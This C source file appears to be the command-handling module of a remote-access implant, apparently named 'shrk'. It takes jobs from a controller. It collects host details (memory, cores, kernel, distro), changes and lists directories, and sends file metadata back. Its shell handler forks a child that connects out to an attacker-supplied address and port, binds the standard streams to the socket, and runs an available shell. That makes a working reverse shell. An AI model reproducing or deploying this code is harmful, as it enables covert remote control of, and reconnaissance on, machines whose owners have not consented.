#include "inc/cmd.h"
#include "inc/job.h"
#include "inc/util.h"

#include <inttypes.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#include <errno.h>
#include <math.h>
#include <stdio.h>
#include <time.h>

#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct cmd_handler_t {
  void (*handler)(job_t *job);
  cmd_t cmd;
};

const char *shells[] = {"fish", "zsh", "bash", "tcsh", "sh", NULL};

bool __cmd_recv_all(job_t *job) {
  while (!job->complete)
    if (!job_recv(job, false))
      return false;
  return true;
}

void __cmd_info(job_t *job) {
#define info_format(r, s)      (snprintf(r, s, "/%lu/%lu/%s", mem, cores, un.release))
#define info_format_full(r, s) (snprintf(r, s, "/%lu/%lu/%s/%s", mem, cores, un.release, distro))

  uint64_t       mem = 0, cores = 0;
  char          *res = NULL, *distro = NULL;
  int64_t        size = 0;
  struct utsname un;

  // recv all the data for the job
  if (!__cmd_recv_all(job)) {
    job_debg("failed to receive the all the job data");
    res = "invalid data";
    goto fail;
  }

  // get system memory
  mem = sysconf(_SC_PHYS_PAGES) * sysconf(_SC_PAGESIZE);
  mem /= 1024;

  // get cores
  cores = sysconf(_SC_NPROCESSORS_ONLN);

  // get kernel
  if ((uname(&un)) != 0) {
    res = strerror(errno);
    goto fail;
  }

  // parse /etc/os-release for distro
  if ((distro = get_distro()) == NULL) {
    if ((size = info_format(NULL, 0)) < 0) {
      res = "size calculation failed";
      goto fail;
    }

    res = malloc(++size);
    info_format(res, size);
  }

  else {
    if ((size = info_format_full(NULL, 0)) < 0) {
      res = "size calculation failed";
      goto fail;
    }

    res = malloc(++size);
    info_format_full(res, size);
    free(distro);
  }

  job_data_clear(job);
  job_data_set(job, res, 0);
  goto end;

fail:
  job_data_clear(job);
  job_data_set(job, res, 0);
  res = NULL;

end:
  free(res);

  job->complete = true;
  job_send(job, false);
}

void __cmd_shell(job_t *job) {
  char           *data = NULL, *res = NULL, **shell = NULL;
  struct sockaddr saddr;
  uint16_t        port = 0, i;
  pid_t           cpid = 0;

  // recv all the data for the job
  if (!__cmd_recv_all(job)) {
    job_debg("failed to receive the all the job data");
    res = "invalid data";
    goto end;
  }

  // parse the provided data (we can freely modify it)
  for (data = job->data; *data != 0; data++) {
    if (*data != ' ')
      continue;

    *data = 0;
    port  = atoi(++data);
    break;
  }

  // resolve the provided address
  if (!resolve(NULL, &saddr, job->data, port)) {
    res = "failed to resolve the address";
    goto end;
  }

  // find an available shell to execute for the reverse shell
  for (shell = (char **)shells; *shell != NULL; shell++)
    if (path_find(*shell))
      break;

  // mostly likely we'll find a shell but just in case
  if (NULL == *shell) {
    res = "no available shell";
    goto end;
  }

  if ((cpid = fork()) == 0) {
    int s = 0;

    // create a TCP socket for the reverse shell connection
    if ((s = socket(saddr.sa_family, SOCK_STREAM, 0)) < 0)
      exit(1);

    // conenct to the the remote address
    if (connect(s, (struct sockaddr *)&saddr, sizeof(struct sockaddr)) < 0)
      exit(1);

    // duplicate std{out,in,err}
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // execute da shell we found
    printf("[shrk] connection was successful, executing %s\n", *shell);
    char *const argv[] = {*shell, NULL};
    execvp(*shell, argv);

    // fuck
    printf("[shrk] execution failed! closing connection\n");
    close(s);
    exit(1);
  }

  if (cpid < 0) {
    debug("failed to create fork for the reverse shell job: %s", strerror(errno));
    res = "fork failed";
    goto end;
  }

  debug("launched a child process (%d) for a %s reverse shell", cpid, *shell);
  res = "success";
end:
  job_data_clear(job);
  job_data_set(job, res, 0);

  job->complete = true;
  job_send(job, false);
}

void __cmd_chdir(job_t *job) {
  char *res = NULL;

  // recv all the data for the job
  if (!__cmd_recv_all(job)) {
    job_debg("failed to receive the all the job data");
    res = "invalid data";
    goto end;
  }

  // chdir to the provided dir
  if (chdir(job->data) != 0) {
    res = strerror(errno);
    goto end;
  }

  res = "success";
end:
  job_data_clear(job);
  job_data_set(job, res, 0);
  job->complete = true;
  job_send(job, false);
}

bool __cmd_list_ent(job_t *job, struct dirent *ent) {
  // name, type, mode, uid, gid, size, modified time, created time
#define ent_format(r, s)                                                                                               \
  snprintf(r,                                                                                                          \
      s,                                                                                                               \
      "//%s/%d/%d/%d/%d/%lu/%lld/%lld",                                                                                \
      name,                                                                                                            \
      is_dir,                                                                                                          \
      st.st_mode,                                                                                                      \
      st.st_uid,                                                                                                       \
      st.st_gid,                                                                                                       \
      st.st_size,                                                                                                      \
      (long long)(st.st_mtim.tv_sec),                                                                                  \
      (long long)(st.st_ctim.tv_sec))

  struct stat st;
  bool        ret    = false;
  char       *name   = ent->d_name;
  bool        is_dir = ent->d_type == DT_DIR;

  if (stat(name, &st) != 0) {
    job_debgf("stat failed for %s: %s", ent->d_name, strerror(errno));
    goto end;
  }

  job_data_clear(job);
  job->complete = false;

  if ((job->data_size = 1 + ent_format(job->data, 0)) < 0) { // 1 for the null terminator
    job_debgf("failed to calculate data size for %s", ent->d_name);
    goto end;
  }

  if ((job->data_size = ent_format(job->data = malloc(job->data_size), job->data_size)) < 0) {
    job_debgf("failed to format data for %s", ent->d_name);
    goto end;
  }

  job_debgf("sending the entry for '%s'", ent->d_name);

  if (!job_send(job, false)) {
    job_debgf("failed to send the file data for %s", ent->d_name);
    goto end;
  }

  ret = true;
end:
  job_data_clear(job);
  return ret;
}

void __cmd_list(job_t *job) {
  struct dirent *ent = NULL;
  DIR           *dir = NULL;
  char          *res = NULL;

  // recv all the data for the job (we dont really care abt the data)
  if (!__cmd_recv_all(job)) {
    job_debg("failed to receive the all the job data");
    res = "invalid data";
    goto end;
  }

  // open the current dir
  if ((dir = opendir(".")) == NULL) {
    res = strerror(errno);
    goto end;
  }

  // read the current dir
  while ((ent = readdir(dir)) != NULL) {
    // only dirs and files
    if (ent->d_type != DT_DIR && ent->d_type != DT_REG)
      continue;

    // send the current entry
    if (__cmd_list_ent(job, ent))
      continue;

    job_debgf("failed to sent the entry: %s", ent->d_name);
    res = "failed to transfer all the entry details";
    goto end;
  }

  res = "/";
end:
  job_data_clear(job);

  if (NULL != dir)
    closedir(dir);

  job_data_set(job, res, 0);
  job->complete = true;
  job_send(job, false);
}

struct cmd_handler_t handlers[] = {
    {.handler = __cmd_info,  .cmd = CMD_INFO },
    {.handler = __cmd_shell, .cmd = CMD_SHELL},
    {.handler = __cmd_chdir, .cmd = CMD_CHDIR},
    {.handler = __cmd_list,  .cmd = CMD_LIST },
    NULL,
};

bool cmd_handle(job_t *job) {
  struct cmd_handler_t *h = NULL;

  for (h = handlers; h != NULL; h++)
    if (h->cmd == job->cmd)
      break;

  if (NULL == h)
    return false;

  job_debgf("handling the command '%c' with %p", job->cmd, h->handler);

  h->handler(job);
  return true;
}
